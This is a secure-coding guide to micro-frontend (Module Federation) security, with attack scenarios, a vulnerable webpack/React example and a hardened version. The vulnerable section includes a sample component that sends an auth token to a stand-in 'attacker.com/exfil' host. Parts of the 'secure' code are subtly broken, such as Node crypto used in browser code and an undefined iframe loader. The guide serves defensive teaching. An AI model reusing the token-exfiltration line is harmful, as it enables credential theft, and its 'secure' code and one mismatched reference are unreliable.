# 46 · Micro-Frontend (MFE) Security

## What It Is

Micro-frontends (MFE) split a single application into multiple independently deployed frontend modules, often using Module Federation (webpack 5+) or similar mechanisms. Each "remote" module is loaded and executed within the host application's JavaScript context at runtime. This architectural pattern trades traditional monolithic deployment for modularity and team autonomy, but introduces a new attack surface: untrusted remote code execution, shared state/token contamination across module boundaries, CSP bypass opportunities, and privilege escalation between host and remote modules.

MFE security involves controlling which domains can provide remote modules, isolating shared state and authentication tokens, preventing one remote from accessing another's sensitive data or executing privileged operations, and ensuring CSP rules apply consistently across all federated bundles. Unlike traditional third-party script injection (where you at least control the loader), MFE remotes are often dynamically loaded based on configuration, environment variables, or runtime discovery, creating additional trust and integrity challenges.

## Why It Matters

A compromised or misconfigured remote module runs in the same JavaScript context as your host application and all other remotes, with access to the same `localStorage`, cookies, global objects, and DOM. A single rogue remote can steal authentication tokens, hijack API calls, exfiltrate user data, or perform actions on behalf of the user. MFE deployments often involve multiple teams building independent modules, increasing the surface area for misconfigurations and trust violations. Without strict isolation and allowlisting, an attacker can inject a malicious remote URL, redirect legitimate remote URLs to attacker-controlled servers, or exploit misconfigured shared dependencies to escalate privileges.

## Attack Scenarios

1. **Token Hijacking via Shared State**: A legitimate e-commerce MFE architecture has a cart module, checkout module, and admin module, all federating through a shared auth token stored in `localStorage`. An attacker compromises the checkout module's build pipeline and injects code to read `localStorage['auth_token']` and send it to their server. The host and other remotes are unaware because all modules share the same token storage. The attacker can now use the stolen token to make API calls, even after the checkout module is patched.

2. **Malicious Remote Injection**: A SaaS platform uses environment variables to configure remote URLs (e.g., `REMOTE_AUTH_URL=https://auth.example.com`). An attacker gains access to a CI/CD environment variable or DNS and changes it to `https://attacker.com/malicious-auth`. The host loads the malicious module, which immediately exfiltrates all tokens and session data, then displays a fake login screen to intercept future credentials. The fake module is indistinguishable from the legitimate one until users report credential reuse failures.

3. **Privilege Escalation via Host Globals**: An admin dashboard federates admin-specific modules from multiple teams. The host application exposes an API client (e.g., `window.adminApi`) for remotes to perform privileged actions. A compromised user-management remote exploits a bug in the host to call `window.adminApi.deleteAllUsers()` without proper authorization checks. The host trusted the remote because it's on the allowlist, but the remote's build was compromised upstream in a dependency.

## Vulnerable Code

```javascript
// webpack.config.js - Module Federation with no integrity or origin checks
const { ModuleFederationPlugin } = require('webpack').container;

module.exports = {
  plugins: [
    new ModuleFederationPlugin({
      name: 'host',
      remotes: {
        // Remotes loaded from arbitrary URLs without integrity validation
        auth: `auth@${process.env.REMOTE_AUTH_URL || 'https://auth.example.com'}/remoteEntry.js`,
        checkout: `checkout@${process.env.REMOTE_CHECKOUT_URL || 'https://checkout.example.com'}/remoteEntry.js`,
        admin: 'admin@https://admin.example.com/remoteEntry.js', // Hardcoded, no version pinning
      },
      shared: {
        // Shared state across all remotes - tokens and API clients exposed globally
        'auth-context': { singleton: true, strictVersion: false },
        'api-client': { singleton: true, strictVersion: false },
        localStorage: { singleton: true }, // Dangerous: all remotes access same storage
      },
    }),
  ],
};

// src/App.jsx - Shared state with no isolation
import React, { createContext, useContext, useEffect } from 'react';

export const AuthContext = createContext();

export function AuthProvider({ children }) {
  const [authToken, setAuthToken] = React.useState(() => {
    // Read token from localStorage - accessible by all remotes
    return localStorage.getItem('auth_token');
  });

  useEffect(() => {
    // Store token in a global for easy remote access
    window.authToken = authToken;
  }, [authToken]);

  return (
    <AuthContext.Provider value={{ authToken, setAuthToken }}>
      {children}
    </AuthContext.Provider>
  );
}

// Malicious remote code - unrestricted access to shared state
const StealToken = () => {
  const { authToken } = useContext(AuthContext);

  useEffect(() => {
    // Send token to attacker server
    fetch('https://attacker.com/exfil', {
      method: 'POST',
      body: JSON.stringify({ token: authToken, timestamp: new Date() }),
    });
  }, [authToken]);

  return null;
};
```

## Secure Code

```javascript
// webpack.config.js - Module Federation with integrity and origin validation
const { ModuleFederationPlugin } = require('webpack').container;
const crypto = require('crypto');

const ALLOWED_REMOTES = {
  auth: {
    url: 'https://auth.example.com/remoteEntry.js',
    hash: 'sha256-abc123...', // Precomputed SRI hash
    allowedOrigins: ['https://auth.example.com'],
  },
  checkout: {
    url: 'https://checkout.example.com/remoteEntry.js',
    hash: 'sha256-def456...',
    allowedOrigins: ['https://checkout.example.com'],
  },
};

module.exports = {
  plugins: [
    new ModuleFederationPlugin({
      name: 'host',
      remotes: {
        auth: `auth@${ALLOWED_REMOTES.auth.url}`,
        checkout: `checkout@${ALLOWED_REMOTES.checkout.url}`,
      },
      shared: {
        // Strict versioning, no singleton pattern for sensitive data
        'shared-ui': { singleton: false, requiredVersion: '^2.0.0' },
      },
    }),
  ],
};

// src/mfe/RemoteLoader.ts - Validate remote integrity before execution
import crypto from 'crypto';

interface RemoteConfig {
  url: string;
  hash: string;
  allowedOrigins: string[];
}

export async function loadRemoteModule(
  name: string,
  config: RemoteConfig
): Promise<any> {
  const url = new URL(config.url);

  // 1. Validate origin
  if (!config.allowedOrigins.includes(url.origin)) {
    throw new Error(`Remote origin not allowed: ${url.origin}`);
  }

  // 2. Fetch with credentials: 'omit' to prevent cookie leakage
  const response = await fetch(config.url, {
    credentials: 'omit',
    headers: { 'X-Requested-With': 'XMLHttpRequest' },
  });

  if (!response.ok) {
    throw new Error(`Failed to fetch remote: ${response.status}`);
  }

  const buffer = await response.arrayBuffer();

  // 3. Verify SRI hash before evaluation
  const hash = crypto
    .createHash('sha256')
    .update(Buffer.from(buffer))
    .digest('base64');

  if (`sha256-${hash}` !== config.hash) {
    throw new Error(`Integrity check failed for ${name}`);
  }

  // 4. Load in isolated context
  return loadScriptInIframe(name, new TextDecoder().decode(buffer));
}

// src/context/AuthContext.tsx - Isolated token storage per module
import React, { createContext, useContext } from 'react';

interface TokenStore {
  token: string;
  moduleId: string;
  expiresAt: number;
}

const HostTokenContext = createContext<TokenStore | null>(null);

// Only host can write tokens; remotes get read-only access
export function HostAuthProvider({ children }: { children: React.ReactNode }) {
  const [token, setToken] = React.useState<TokenStore | null>(null);

  // Store token in sessionStorage (cleared on tab close), not localStorage
  const updateToken = (newToken: string) => {
    const store: TokenStore = {
      token: newToken,
      moduleId: 'host',
      expiresAt: Date.now() + 3600000, // 1 hour
    };
    sessionStorage.setItem('__host_token', JSON.stringify(store));
    setToken(store);
  };

  return (
    <HostTokenContext.Provider value={token}>
      {children}
    </HostTokenContext.Provider>
  );
}

// Remotes get a read-only hook that cannot access tokens directly
export function useRemoteAuth() {
  const context = useContext(HostTokenContext);

  return {
    // Remotes can only make authenticated requests through host
    makeAuthenticatedRequest: async (endpoint: string, options?: RequestInit) => {
      return fetch(`/api/proxy?endpoint=${encodeURIComponent(endpoint)}`, {
        ...options,
        credentials: 'omit', // Prevent remote from reading cookies
      });
    },
  };
}
```

## Mitigations

- **Implement Subresource Integrity (SRI) for all remote entries**: Compute and pin SRI hashes for each remote module entry point, validate them at load time before executing any code. Store hashes in a secure configuration file (not accessible to remotes) and rotate them with each legitimate release.

- **Strict allowlist of remote origins and URLs**: Maintain a hardcoded, immutable list of allowed remote URLs and their origins. Never derive remote URLs from user input, query parameters, or environment variables alone; use environment variables to select from a pre-approved set of URLs, not to construct arbitrary URLs.

- **Isolate authentication tokens per module or use opaque session IDs**: Store sensitive tokens in `sessionStorage` (not `localStorage`) or use HTTP-only, Secure cookies. Never expose raw tokens on `window` globals. Use a token proxy service so remotes must request through the host to access APIs, preventing direct token exfiltration.

- **Disable sharing of singletons for sensitive code**: Avoid `singleton: true` for shared auth contexts, API clients, or utility libraries that could be compromised and affect all other remotes. Use `strictVersion: true` to ensure remotes use compatible, audited versions of shared dependencies.

- **Use Content Security Policy (CSP) with `script-src 'self'` and allowlist specific remote origins**: Define a strict CSP that permits script execution only from the host and whitelisted remote domains. Use `require-sri-for script` to enforce SRI validation at the CSP level. Report violations to detect intrusions or misconfigured remotes.

- **Apply dynamic code analysis and sandboxing at load time**: Scan remote module bundles for suspicious APIs (e.g., `fetch`, `Worker`, `eval`) before execution. Optionally load remotes in Web Workers or iframes with restricted permissions to limit damage from a compromised module. Use a runtime security layer to intercept and audit remote module initialization.

- **Implement CSP `report-uri` and monitor for violations**: Configure CSP to report all violations to a logging endpoint. Monitor for repeated violations that could indicate a compromised remote or an attacker attempting to inject code. Alert when a remote attempts to load scripts from unexpected origins or exfiltrate data via fetch/beacon.

## References

- [OWASP: Micro Frontends Security Best Practices](https://cheatsheetseries.owasp.org/cheatsheets/Microservices_based_Vulnerability_Management_Cheat_Sheet.html)
- [webpack Module Federation Security Considerations](https://webpack.js.org/concepts/module-federation/)
- [Content Security Policy (CSP) - MDN](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)
- [Subresource Integrity (SRI) - MDN](https://developer.mozilla.org/en-US/docs/Web/Security/Subresource_Integrity)
- [Web Workers for Sandboxing - MDN](https://developer.mozilla.org/en-US/docs/Web/API/Web_Workers_API)
